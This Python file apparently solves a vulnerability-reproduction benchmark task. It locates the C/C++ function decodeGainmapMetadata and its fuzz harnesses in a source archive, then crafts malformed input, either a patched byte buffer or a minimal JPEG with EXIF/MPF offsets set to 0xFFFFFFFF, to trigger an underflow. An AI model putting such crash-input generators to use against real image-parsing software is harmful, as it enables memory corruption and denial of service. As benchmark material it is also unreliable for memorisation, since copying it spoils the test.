import os
import re
import tarfile
import tempfile
import zipfile
from typing import Dict, List, Optional, Tuple


def _safe_extract_tar(tar: tarfile.TarFile, path: str) -> None:
    base = os.path.abspath(path)
    for member in tar.getmembers():
        member_path = os.path.abspath(os.path.join(path, member.name))
        if not (member_path == base or member_path.startswith(base + os.sep)):
            continue
        if member.islnk() or member.issym():
            continue
        tar.extract(member, path=path)


def _extract_src(src_path: str) -> Tuple[str, Optional[tempfile.TemporaryDirectory]]:
    if os.path.isdir(src_path):
        return src_path, None
    if tarfile.is_tarfile(src_path):
        td = tempfile.TemporaryDirectory()
        with tarfile.open(src_path, "r:*") as tar:
            _safe_extract_tar(tar, td.name)
        return td.name, td
    if zipfile.is_zipfile(src_path):
        td = tempfile.TemporaryDirectory()
        with zipfile.ZipFile(src_path, "r") as zf:
            for zi in zf.infolist():
                name = zi.filename
                if not name or name.endswith("/") or name.startswith("/") or ".." in name.split("/"):
                    continue
                out_path = os.path.abspath(os.path.join(td.name, name))
                base = os.path.abspath(td.name)
                if not (out_path == base or out_path.startswith(base + os.sep)):
                    continue
                os.makedirs(os.path.dirname(out_path), exist_ok=True)
                with zf.open(zi) as src_f, open(out_path, "wb") as dst_f:
                    dst_f.write(src_f.read())
        return td.name, td
    return src_path, None


def _iter_source_files(root: str) -> List[str]:
    exts = {".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".inc", ".inl", ".ipp"}
    res = []
    for dirpath, dirnames, filenames in os.walk(root):
        dirnames[:] = [d for d in dirnames if d not in {".git", ".svn", ".hg", "build", "out", "dist"}]
        for fn in filenames:
            _, ext = os.path.splitext(fn)
            if ext.lower() in exts:
                res.append(os.path.join(dirpath, fn))
    return res


def _read_text_limited(path: str, limit: int = 2_000_000) -> Optional[str]:
    try:
        st = os.stat(path)
        if st.st_size > limit:
            return None
        with open(path, "rb") as f:
            data = f.read(limit + 1)
        if len(data) > limit:
            return None
        try:
            return data.decode("utf-8", "replace")
        except Exception:
            return data.decode("latin-1", "replace")
    except Exception:
        return None


def _find_fuzzers(root: str) -> List[Tuple[str, str]]:
    res = []
    for p in _iter_source_files(root):
        txt = _read_text_limited(p)
        if not txt:
            continue
        if "LLVMFuzzerTestOneInput" in txt or "FuzzerTestOneInput" in txt:
            res.append((p, txt))
    return res


def _find_decode_gainmap_def(root: str) -> Tuple[Optional[str], Optional[str], Optional[str]]:
    pats = [
        re.compile(r"\bdecodeGainmapMetadata\s*\([^;{}]*\)\s*\{", re.M),
        re.compile(r"\bdecodeGainmapMetadata\s*\([^;{}]*\)\s*(?:noexcept\s*)?\{", re.M),
    ]
    for p in _iter_source_files(root):
        txt = _read_text_limited(p)
        if not txt:
            continue
        idx = -1
        m = None
        for pat in pats:
            m = pat.search(txt)
            if m:
                idx = m.start()
                break
        if idx < 0:
            continue
        brace_start = txt.find("{", m.end() - 1)
        if brace_start < 0:
            continue
        depth = 0
        end = None
        for i in range(brace_start, len(txt)):
            c = txt[i]
            if c == "{":
                depth += 1
            elif c == "}":
                depth -= 1
                if depth == 0:
                    end = i + 1
                    break
        if end is None:
            continue
        body = txt[brace_start:end]
        sig = txt[m.start():brace_start].strip()
        return p, txt, sig + "\n" + body
    for p in _iter_source_files(root):
        txt = _read_text_limited(p)
        if not txt:
            continue
        if "decodeGainmapMetadata" in txt:
            return p, txt, None
    return None, None, None


def _parse_int(s: str, consts: Dict[str, int]) -> Optional[int]:
    s = s.strip()
    if not s:
        return None
    if s in consts:
        return consts[s]
    if s.startswith("(") and s.endswith(")"):
        return _parse_int(s[1:-1], consts)
    try:
        if s.startswith("0x") or s.startswith("0X"):
            return int(s, 16)
        if re.fullmatch(r"\d+", s):
            return int(s, 10)
    except Exception:
        return None
    return None


def _extract_consts(file_text: str) -> Dict[str, int]:
    consts: Dict[str, int] = {}
    if not file_text:
        return consts
    for m in re.finditer(r"(?m)^\s*#\s*define\s+([A-Za-z_]\w*)\s+(\d+|0x[0-9A-Fa-f]+)\b", file_text):
        name = m.group(1)
        val = m.group(2)
        iv = _parse_int(val, consts)
        if iv is not None:
            consts[name] = iv
    for m in re.finditer(
        r"(?m)^\s*(?:static\s+)?(?:constexpr\s+|const\s+)?(?:size_t|int|unsigned|uint32_t|uint64_t|uint16_t|uint8_t)\s+([A-Za-z_]\w*)\s*=\s*(\d+|0x[0-9A-Fa-f]+)\s*;",
        file_text,
    ):
        name = m.group(1)
        val = m.group(2)
        iv = _parse_int(val, consts)
        if iv is not None:
            consts[name] = iv
    return consts


def _derive_min_len(func_text: str, consts: Dict[str, int]) -> int:
    if not func_text:
        return 0
    max_need = 0
    size_vars = r"(?:size|len|length|dataSize|data_size|srcSize|src_size|bufSize|buf_size|input_size|inputSize)"
    for m in re.finditer(rf"\b{size_vars}\b\s*(<=|<)\s*([A-Za-z_]\w*|\d+|0x[0-9A-Fa-f]+)", func_text):
        op = m.group(1)
        rhs = m.group(2)
        v = _parse_int(rhs, consts)
        if v is None:
            continue
        need = v + (1 if op == "<=" else 0)
        if need > max_need:
            max_need = need
    for m in re.finditer(rf"\b([A-Za-z_]\w*)\b\s*(<=|<)\s*([A-Za-z_]\w*|\d+|0x[0-9A-Fa-f]+)", func_text):
        lhs = m.group(1)
        if lhs not in {"remaining", "avail", "available", "left"}:
            continue
        op = m.group(2)
        rhs = m.group(3)
        v = _parse_int(rhs, consts)
        if v is None:
            continue
        need = v + (1 if op == "<=" else 0)
        if need > max_need:
            max_need = need
    return max_need


def _c_unescape(s: str) -> bytes:
    out = bytearray()
    i = 0
    while i < len(s):
        c = s[i]
        if c != "\\":
            out.append(ord(c) & 0xFF)
            i += 1
            continue
        i += 1
        if i >= len(s):
            out.append(ord("\\"))
            break
        esc = s[i]
        i += 1
        if esc == "n":
            out.append(0x0A)
        elif esc == "r":
            out.append(0x0D)
        elif esc == "t":
            out.append(0x09)
        elif esc == "\\":
            out.append(0x5C)
        elif esc == '"':
            out.append(0x22)
        elif esc == "0":
            out.append(0x00)
            j = i
            oct_digits = ""
            while j < len(s) and len(oct_digits) < 2 and s[j] in "01234567":
                oct_digits += s[j]
                j += 1
            if oct_digits:
                i = j
        elif esc == "x":
            if i + 1 <= len(s):
                hx = s[i:i + 2]
                if re.fullmatch(r"[0-9A-Fa-f]{2}", hx):
                    out.append(int(hx, 16))
                    i += 2
                else:
                    out.append(ord("x"))
            else:
                out.append(ord("x"))
        elif esc in "01234567":
            oct_digits = esc
            j = i
            while j < len(s) and len(oct_digits) < 3 and s[j] in "01234567":
                oct_digits += s[j]
                j += 1
            try:
                out.append(int(oct_digits, 8) & 0xFF)
                i = j
            except Exception:
                out.append(ord(esc) & 0xFF)
        else:
            out.append(ord(esc) & 0xFF)
    return bytes(out)


def _apply_memcmp_patches(buf: bytearray, func_text: str) -> None:
    if not func_text:
        return
    for m in re.finditer(r'(?:std::)?memcmp\s*\(\s*([^,]+)\s*,\s*(?:u8|u|U|L)?\"((?:\\.|[^"])*)\"\s*,\s*(\d+)\s*\)', func_text):
        expr = m.group(1).strip()
        lit = m.group(2)
        n = int(m.group(3))
        off = 0
        mo = re.search(r"\+\s*(\d+)\b", expr)
        if mo:
            off = int(mo.group(1))
        else:
            mo = re.search(r"\[\s*(\d+)\s*\]", expr)
            if mo:
                off = int(mo.group(1))
        if off < 0 or off >= len(buf):
            continue
        b = _c_unescape(lit)
        b = b[:n]
        end = min(len(buf), off + len(b))
        buf[off:end] = b[: end - off]


def _apply_byte_neq_patches(buf: bytearray, func_text: str) -> None:
    if not func_text:
        return
    for m in re.finditer(r"if\s*\(\s*([A-Za-z_]\w*)\s*\[\s*(\d+)\s*\]\s*!=\s*(0x[0-9A-Fa-f]+|\d+)\s*\)", func_text):
        idx = int(m.group(2))
        if idx < 0 or idx >= len(buf):
            continue
        val_s = m.group(3)
        try:
            val = int(val_s, 16) if val_s.lower().startswith("0x") else int(val_s, 10)
            buf[idx] = val & 0xFF
        except Exception:
            continue


def _build_var_offset_map(func_text: str) -> Dict[str, Tuple[int, int, str]]:
    varmap: Dict[str, Tuple[int, int, str]] = {}
    if not func_text:
        return varmap
    for m in re.finditer(r"\b(?:uint8_t|unsigned\s+char)\s+([A-Za-z_]\w*)\s*=\s*([A-Za-z_]\w*)\s*\[\s*(\d+)\s*\]\s*;", func_text):
        var = m.group(1)
        off = int(m.group(3))
        varmap[var] = (off, 1, "byte")
    for m in re.finditer(
        r"\b(?:uint16_t|uint32_t|uint64_t|size_t|unsigned)\s+([A-Za-z_]\w*)\s*=\s*([A-Za-z_]\w+)\s*\(\s*([A-Za-z_]\w*)\s*\+\s*(\d+)\s*\)\s*;",
        func_text,
    ):
        var = m.group(1)
        fn = m.group(2)
        off = int(m.group(4))
        fnl = fn.lower()
        sz = 0
        if "16" in fnl:
            sz = 2
        elif "32" in fnl:
            sz = 4
        elif "64" in fnl:
            sz = 8
        if sz:
            varmap[var] = (off, sz, fnl)
    for m in re.finditer(
        r"\b([A-Za-z_]\w*)\s*=\s*Read(?:U|u)?(16|32|64)\s*\(\s*([A-Za-z_]\w*)\s*\+\s*(\d+)\s*\)\s*;",
        func_text,
    ):
        var = m.group(1)
        sz = int(m.group(2)) // 8
        off = int(m.group(4))
        varmap[var] = (off, sz, "readu")
    for m in re.finditer(
        r"\b(?:auto|uint16_t|uint32_t|uint64_t|size_t)\s+([A-Za-z_]\w*)\s*=\s*absl::big_endian::Load(16|32|64)\s*\(\s*([A-Za-z_]\w*)\s*\+\s*(\d+)\s*\)\s*;",
        func_text,
    ):
        var = m.group(1)
        sz = int(m.group(2)) // 8
        off = int(m.group(4))
        varmap[var] = (off, sz, "be")
    return varmap


def _apply_var_check_patches(buf: bytearray, func_text: str, varmap: Dict[str, Tuple[int, int, str]]) -> None:
    if not func_text or not varmap:
        return

    def write_le(off: int, sz: int, val: int) -> None:
        if off < 0:
            return
        end = off + sz
        if end > len(buf):
            return
        buf[off:end] = int(val & ((1 << (sz * 8)) - 1)).to_bytes(sz, "little", signed=False)

    def write_be(off: int, sz: int, val: int) -> None:
        if off < 0:
            return
        end = off + sz
        if end > len(buf):
            return
        buf[off:end] = int(val & ((1 << (sz * 8)) - 1)).to_bytes(sz, "big", signed=False)

    for m in re.finditer(r"if\s*\(\s*([A-Za-z_]\w*)\s*(<=|<|>=|>|!=|==)\s*(0x[0-9A-Fa-f]+|\d+)\s*\)", func_text):
        var = m.group(1)
        op = m.group(2)
        rhs_s = m.group(3)
        if var not in varmap:
            continue
        off, sz, kind = varmap[var]
        try:
            rhs = int(rhs_s, 16) if rhs_s.lower().startswith("0x") else int(rhs_s, 10)
        except Exception:
            continue

        if op == "!=":
            target = rhs
        elif op == "==":
            continue
        elif op in (">", ">="):
            target = 0
        elif op in ("<", "<="):
            target = rhs
        else:
            continue

        if sz == 1:
            if 0 <= off < len(buf):
                buf[off] = target & 0xFF
        else:
            if "be" in kind:
                write_be(off, sz, target)
            else:
                write_le(off, sz, target)


def _apply_offset_overflow_hint(buf: bytearray, varmap: Dict[str, Tuple[int, int, str]]) -> None:
    candidates = []
    for var, (off, sz, kind) in varmap.items():
        vn = var.lower()
        if "offset" in vn or vn.endswith("off") or "pos" in vn:
            candidates.append((var, off, sz, kind))
    candidates.sort(key=lambda x: (x[2], x[1]))
    if not candidates:
        return
    var, off, sz, kind = candidates[-1]
    val = (1 << (sz * 8)) - 1
    if off < 0 or off + sz > len(buf):
        return
    if "be" in kind:
        buf[off:off + sz] = val.to_bytes(sz, "big", signed=False)
    else:
        buf[off:off + sz] = val.to_bytes(sz, "little", signed=False)


def _craft_raw_poc(file_text: Optional[str], func_text: Optional[str]) -> bytes:
    consts = _extract_consts(file_text or "")
    min_len = _derive_min_len(func_text or "", consts)
    if min_len <= 0:
        min_len = 133
    if min_len > 4096:
        min_len = 4096
    buf = bytearray(b"\xFF" * min_len)
    if func_text:
        _apply_memcmp_patches(buf, func_text)
        _apply_byte_neq_patches(buf, func_text)
        varmap = _build_var_offset_map(func_text)
        _apply_var_check_patches(buf, func_text, varmap)
        _apply_offset_overflow_hint(buf, varmap)
    return bytes(buf)


def _jpeg_segment(marker_byte: int, payload: bytes) -> bytes:
    ln = len(payload) + 2
    if ln > 0xFFFF:
        payload = payload[: 0xFFFF - 2]
        ln = 0xFFFF
    return b"\xFF" + bytes([marker_byte & 0xFF]) + ln.to_bytes(2, "big") + payload


def _build_minimal_jpeg_with_exif_mpf_underflow() -> bytes:
    soi = b"\xFF\xD8"
    eoi = b"\xFF\xD9"

    tiff_underflow = b"MM\x00\x2A" + b"\xFF\xFF\xFF\xFF"
    app1_exif = _jpeg_segment(0xE1, b"Exif\x00\x00" + tiff_underflow)
    app2_mpf = _jpeg_segment(0xE2, b"MPF\x00" + tiff_underflow)

    dqt_payload = b"\x00" + (b"\x01" * 64)
    dqt = _jpeg_segment(0xDB, dqt_payload)

    sof0_payload = b"\x08" + b"\x00\x01" + b"\x00\x01" + b"\x01" + b"\x01\x11\x00"
    sof0 = _jpeg_segment(0xC0, sof0_payload)

    bits = bytes([1] + [0] * 15)
    dht_payload = b"\x00" + bits + b"\x00" + b"\x10" + bits + b"\x00"
    dht = _jpeg_segment(0xC4, dht_payload)

    sos_payload = b"\x01" + b"\x01\x00" + b"\x00\x3F\x00"
    sos = _jpeg_segment(0xDA, sos_payload)

    entropy = b"\x3F"

    return soi + app1_exif + app2_mpf + dqt + sof0 + dht + sos + entropy + eoi


class Solution:
    def solve(self, src_path: str) -> bytes:
        root, td = _extract_src(src_path)
        try:
            fuzzers = _find_fuzzers(root)
            fuzzer_texts = [t for _, t in fuzzers]
            direct_call = any("decodeGainmapMetadata" in t for t in fuzzer_texts)

            decode_file, decode_file_text, decode_func_text = _find_decode_gainmap_def(root)

            if direct_call:
                return _craft_raw_poc(decode_file_text, decode_func_text or decode_file_text)

            hay = (decode_func_text or "") + "\n" + (decode_file_text or "") + "\n" + "\n".join(fuzzer_texts[:5])
            jpeg_related = bool(re.search(r"\b(jpeg|jpg|exif|mpf|jfif|app1|app2|libjpeg|turbojpeg)\b", hay, re.I))
            if decode_file and re.search(r"(jpeg|jpg|exif|mpf)", decode_file, re.I):
                jpeg_related = True
            if re.search(r"\"Exif\\0\\0\"|\"MPF\\0\"|Exif\x00\x00|MPF\x00", hay):
                jpeg_related = True

            if jpeg_related:
                return _build_minimal_jpeg_with_exif_mpf_underflow()

            return _craft_raw_poc(decode_file_text, decode_func_text or decode_file_text)
        finally:
            if td is not None:
                td.cleanup()